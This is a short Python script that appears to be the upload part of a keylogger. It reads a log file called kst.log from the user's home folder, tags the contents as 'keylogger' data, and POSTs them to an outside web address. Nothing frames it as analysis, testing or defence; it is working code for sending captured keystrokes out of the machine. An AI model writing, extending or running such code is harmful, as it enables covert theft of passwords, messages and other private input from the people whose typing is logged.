from urllib import request
from pathlib import Path
import json
import os

FILE_NAME = "{0}/kst.log".format(str(Path.home()))

if os.path.exists(FILE_NAME):

  file = open(FILE_NAME, "r").read()

  arrayData = {
    "data": file,
    "type": "keylogger"
  }

  data = json.dumps(arrayData).encode('utf8')

  req = request.Request(
    "https://marroquin.dev/api/tests",
    data=data,
    headers={
      'content-type': 'application/json'
    }
  )

  resp = request.urlopen(req)
